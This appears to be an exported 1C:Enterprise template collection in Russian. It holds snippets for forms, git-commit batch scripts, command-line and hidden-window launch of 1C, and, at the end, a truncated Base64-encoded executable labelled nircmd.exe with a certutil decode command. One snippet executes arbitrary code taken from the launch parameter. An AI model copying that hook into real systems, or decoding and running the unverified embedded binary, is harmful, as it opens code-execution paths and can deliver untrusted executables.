        СоединениеСРабочимПроцессом.UpdateInfoBase(РабочаяБаза);
        ВызватьИсключение ""Выключенно регламентное задание. Перезапуститесь."" ; // Что бы прервать сеанс регламентного
    КонецЕсли;

    Возврат Ложь;
КонецФункции

И не забываем вставить вызов этой процедуры из модуля сеанса...

Процедура УстановкаПараметровСеанса()
    ПолныеПрава.ПроверкаНаКопию();
    ...
КонецПроцедуры"}
}
},
{2,
{"Форма",1,0,"",""},
{0,
{"Объект формы",0,0,"ОбъектФормы","<?""Имя документа"">Форма 		= ПолучитьФорму(""Документ.<?""Имя документа"">.ФормаОбъекта"");
<?""Имя документа"">ДанныеФормы 	= Форма.Объект; // Получаем объект формы в переменную
//Форма.ПриОткрытии(Неопределено); // Выполнение процедур формы"}
},
{0,
{"Открыть форму",0,0,"ПоказатьДок[умент]","<?""Имя документа"">.ПолучитьФорму().Открыть();"}
}
},
{16,
{"Командная строка (CMD)",1,0,"",""},
{3,
{"GIT",1,0,"",""},
{0,
{"1С Внешние обработки: подключаем Git и храним историю изменений (cmd, DESIGNER, git)",0,0,"","@: 1С Внешние обработки: подключаем Git и храним историю изменений
@: https://xn----1-bedvffifm4g.xn--p1ai/news/2018-11-30-extreps-and-git/
@echo off

@: Установка русской кодировки
@chcp 1251

@: Распакуем обработку
SET PATH1C=""c:\Program Files\1cv8\8.3.15.1489\bin\1cv8.exe"" 
SET EXT_FOLDER=""c:\Обработки"" 
SET SRC=%cd%
SET OUT=%cd%\out.txt
del /f /q %OUT% 
FOR %%F IN (*.epf *.erf) DO ( %PATH1C% DESIGNER /DumpExternalDataProcessorOrReportToFiles %SRC% %%F /OUT %OUT% -NoTruncate ) 

@: Закоммитим
if not exist %SRC%\.git git init

set /P txtcommit=""Введите текст коммита: "" 
git add . 
git commit -m ""%txtcommit%""
@: git commit -m ""%date% %time%: %txtcommit%"""}
},
{0,
{"1С Внешние обработки: подключаем Git и храним историю изменений (cmd, DESIGNER, git) (перетаскиванием или через Отправить)",0,0,"","@: 1С Внешние обработки: подключаем Git и храним историю изменений
@: https://xn----1-bedvffifm4g.xn--p1ai/news/2018-11-30-extreps-and-git/
@echo off

@: Установка русской кодировки
@chcp 1251

@: Распакуем обработку
SET PATH1C=""C:\Program Files\1cv8\8.3.15.1489\bin\1cv8.exe"" 
SET EXT_FOLDER=""C:\Обработки"" 
SET SRC=%cd%
SET OUT=%cd%\out.txt
del /f /q ""%OUT%""
FOR %%F IN (*.epf *.erf) DO ( %PATH1C% DESIGNER /DumpExternalDataProcessorOrReportToFiles ""%SRC%"" ""%%F"" /OUT ""%OUT%"" -NoTruncate ) 

@: Закоммитим
if not exist ""%SRC%\.git"" git init

set /P txtcommit=""Введите текст коммита: "" 
git add . 
git commit -m ""%txtcommit%""
@: git commit -m ""%date% %time%: %txtcommit%"""}
},
{0,
{"Основные команды в Git для ежедневного использования (init, status, add, diff, commit, log)",0,0,"","git init	Создать новый Git репозиторий
git status	Показать состояние содержимого рабочего каталога и индекса
git add		Добавить файлы из рабочего каталога в индекс
git diff	Показать изменения между рабочим каталогом и индексом
git commit	На постоянной основе сохранить все изменения из индекса в репозиторий
git log		Показать список всех предыдущих коммитов

Подробнее:
Добавить Файл в Индекс в Git
Выполните следующую команду, чтобы Git начал отслеживать изменения в файле (добавил в индекс):
$ git add <имя_файла>
Чтобы добавить в индекс все файлы, выполните:
$ git add .

Показать Изменения в Git
Когда состояние файлов отслеживается, мы можем просмотреть изменения между рабочим каталогом и индексом:
Дельный Совет: Что-то пошло не так? Вы легко можете отменить все изменения и вернуться к последнему коммиту! Читать далее →
Чтобы показать изменения, выполните:
$ git diff
Чтобы просмотреть как был изменен конкретный файл, выполните:
$ git diff <имя_файла>

Сохранить Изменения в Git
Так что же делает коммит? Коммит на постоянной основе сохраняет изменения из индекса внутри репозитория.
Коммит — это завершающий шаг в рабочем процессе с использованием Git.
Сохранить все изменения из индекса:
$ git commit -m ""Краткое описание""
Сделать коммит только определенного файла:
$ git commit -m ""Краткое описание"" <имя_файла>

Стандартные правила при составлении описания коммита в Git:
Должно браться в кавычки
Должно быть написано в настоящем времени
Должно быть кратким (не более 50-ти символов)"}
}
},
{4,
{"1С",1,0,"",""},
{0,
{"Запуск обработки",0,0,"","// Запуск обработки из командной строки Windows (для запуска через службы Windows)

""C:\Program Files\1cv8\bin\1cv8.exe"" ENTERPRISE /F ""Путь_к_ИБ_D:\Конфигурации\Типовые\УпрТорг"" /N ""ИмяПользователя"" /P ""Пароль"" /Execute ""Путь_к_обработке.epf""

""C:\Program Files\1cv8\bin\1cv8.exe"" ENTERPRISE /S bases\ut_sql /N ""ИмяПользователя"" /P ""Пароль"" /Execute ""Путь_к_обработке.epf""
 
""C:\Program Files\1cv8\bin\1cv8.exe"" ENTERPRISE /IBName ""запуск информационной базы по имени базы в списке информационнх баз"" /N ""ИмяПользователя"" /P ""Пароль"" /Execute ""Путь_к_обработке.epf""


// После выполнения обработки 1С, если её надо закрыть:  
// ЗавершитьРаботуСистемы()
"}
},
{0,
{"Запуск 1С с параметрами",0,0,"","/N ""ИмяПользователя"" /P ""Пароль"""}
},
{0,
{"Запуск кода в конфигурации из командной строки",0,0,"","Запуск кода в конфигурации из командной строки
Иногда возникает необходимость запуска кода в базе 1С из командной строки. Например, надо выполнять те или иные процедуры по расписанию, но при этом нет желания каждый раз менять конфигурацию, а хочется прописать всё в батнике и запускать через шедулер (at).
Вижу следующие варианты:
1. изменить один раз конфигурацию, чтобы потом можно было передавать через параметр исполняемый код.
2. прописать выполняемый код во внешней обработке и запускать 1С с параметром /execute
3. написать на vba процедуру выполнения заданных операций через COM.

1. Изменить один раз конфигурацию, чтобы потом можно было передавать через параметр исполняемый код.
В таком варианте необходимо прописать следующий код в модуле приложения процедуре ПриНачалеРаботыСистемы():
Код 1C v 8.х
 Ключ = ""Выполнить=""; 
ДлКлюча = СтрДлина(Ключ);
 Если Лев(ПараметрЗапуска, ДлКлюча) = Ключ Тогда
  Попытка ДлПараметра = СтрДлина(ПараметрЗапуска);
   СтрокаКода = Прав(ПараметрЗапуска, ДлПараметра-ДлКлюча);
   Выполнить(СтрокаКода); 
 Исключение СтрСообщения=""Не удалось выполнить код:""+Символы.ПС+СтрокаКода;
   Предупреждение(СтрСообщения,3); 
   ЗаписьЖурналаРегистрации(""Запуск кода из командной строки."", УровеньЖурналаРегистрации.Ошибка, , , СтрСообщения);
  КонецПопытки;
КонецЕсли;   

После этого для выполнения кода из командной строки достаточно будет запустить 1С с параметром /cВыполнить=[ИсполняемыйКод]. Например:
Код DOS Batch File
 1cv8.exe enterprise /f""C:\Базы\InfoBase"" /nПользователь /pПароль /c Выполнить=Сообщить(""Тест!"");   


2. Прописать выполняемый код во внешней обработке и запускать 1С с параметром /execute
1С имеет параметр запуска ""/Execute"", с помощью которого можно запустить внешнюю обработку после старта системы. Чтобы воспользоваться этой возможностью, необходимо создать внешнюю обработку с исполняемым кодом в модуле формы:
Код 1C v 8.х
 Процедура ПриОткрытии()
 // тут распологается исполняемы код 
Сообщить(""!"");
 // закрываем обработку после выполнения кода 
Закрыть(); 
КонецПроцедуры   

После этого можно запускать данную обработку из командной строки например так:
Код DOS Batch File
 1cv8.exe enterprise /f""C:\Базы\InfoBase"" /nПользователь /pПароль /executec:\Обработки\ВнешняяОбработка.epf   


3. Написать на vba процедуру выполнения заданных операций через COM.
Можно все действия прописать в файле VBS и уже его запускать. Пример содержимого файла VBS:
Код VBS
 Set v81 = CreateObject(""V81.Application"") v81.Connect (""File=""""C:\Базы\InfoBase"""";Usr=""""пользователь"""";Pwd=пароль"") v81.WriteLogEvent(""Был выполнен запуск из VBA"")   "}
},
{0,
{"Как из скрипта VBS запустить 1C, чтобы окно программы не видно было",0,0,"","Как из скрипта VBS запустить 1C, чтобы окно программы не видно было?
Код 1C v 8.х
 WshShell = Новый COMОбъект(""WScript.Shell"");
WshShell.Run(СтрокаЗапуска, 0, Истина)   


Код VBS
 Set WshShell=CreateObject(""WScript.Shell"")
WshShell.Run """"""C:\Program Files\1cv81\bin\1cv8.exe"""" ENTERPRISE /Sserver\base"",0,0    


Код VBS
 On Error Resume Next 
Set objClass = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2:Win32_Process"")
'WScript.Echo ""Запускаем""
Res = objClass.Create(""C:\Program Files\1CV8PDA\1Cv8pSRV.exe """"Параметры"""""", Null, Null, PID)
If Res <> 0 Then
  WScript.Echo ""Код ошибки: "" & Res
  WScript.Quit
End If   "}
}
},
{5,
{"nircmd.exe (этот файл должен лежать в папке с запускаемым кодом)",1,0,"",""},
{0,
{"Файл nircmd.exe зашифрованный в Base64 (расшифровать так: certutil -f -decode ШифрованныйФайл.txt РасшифрованныйФайл.exe)",0,0,"","-----BEGIN CERTIFICATE-----
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
NEYBAEiLyP8V60YBAEiLy0iDxCBb6Tb5///MzEBTSIPsIEiL2UiLCUiFyXQG/xWt
QwEASIMjAEiDYxAASIPEIFvDzMxAU0iD7CBIi9lIi0kISIXJdAb/FYRDAQBIg2MI
AEiDYxgASIPEIFvDQFNIg+wgSIvZSItJCEiFyXQG/xVcQwEASIsLSINjCABIg2MY
AEiFyXQG/xVEQwEASIMjAEiDYxAASIPEIFvDzEiJXCQQV0iD7CBIi9lIiwlIhcl0
Bv8VGUMBAEiDIwBIg2MQAEiNDUFYAQD/FRNDAQBIhcBIiQMPhIwAAABIjRU4WAEA
SIvI/xXvQgEASIM7AEiJQxB0ckiLSwhIhcl0Bv8VzkIBAEiLQxBIg2MIAEiDYxgA
SIXAdCdMjUsISI0NCFgBAEUzwDPS/9BIi0sISI0VDlgBAP8VoEIBAEiJQxhIg3sI
AHQiSItDGEiFwHQZSINkJDAASI1MJDAz0v/QSItEJDBIhcB1CkiLy+jv/v//M8BI
i1wkOEiDxCBfw8zMSIlcJAhIiWwkEEiJdCQYV0iB7EACAABIi+pIi/Ez2+j8/v//
SDvDSIv4dGRIjUwkMjPSQbgIAgAAZolcJDDoKzsBAEiNRCQwQYPJ/0yLxTPSM8nH
RCQoBAEAAEiJRCQg/xU2QgEATIsfTI1EJDBFM8kz0kiLz0H/UzhIixdIi887ww+U
w/9SEEiLzuhQ/v//TI2cJEACAACLw0mLWxBJi2sYSYtzIEmL41/DzEiJXCQIV0iD
7CBIi9lIiwkz/0g7z3QJ/xWLQQEASIk7SIk7SIl7CEiJexBIiXsYSIl7IEiJeyhI
iXswSIl7OEiJe0BIiXtQSIl7WEiLXCQwSIPEIF/DzMxIiVwkCFdIg+wgM9tIi/lI
ORl0CI1DAenoAAAASI0NtVYBAP8VN0EBAEg7w0iJBw+EzQAAAEiNFaxWAQBIi8j/
FRNBAQBIiw9IjRWpVgEASIlHCP8V/0ABAEiLD0iNFaVWAQBIiUcQ/xXrQAEASIsP
SI0VqVYBAEiJRxj/FddAAQBIiw9IjRW1VgEASIlHIP8Vw0ABAEiLD0iNFblWAQBI
iUco/xWvQAEASIsPSI0VxVYBAEiJRzD/FZtAAQBIiw9IjRXJVgEASIlHOP8Vh0AB
AEiLD0iNFc1WAQBIiUdA/xVzQAEASIsPSI0V2VYBAEiJR0j/FV9AAQC7AQAAAEiJ
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
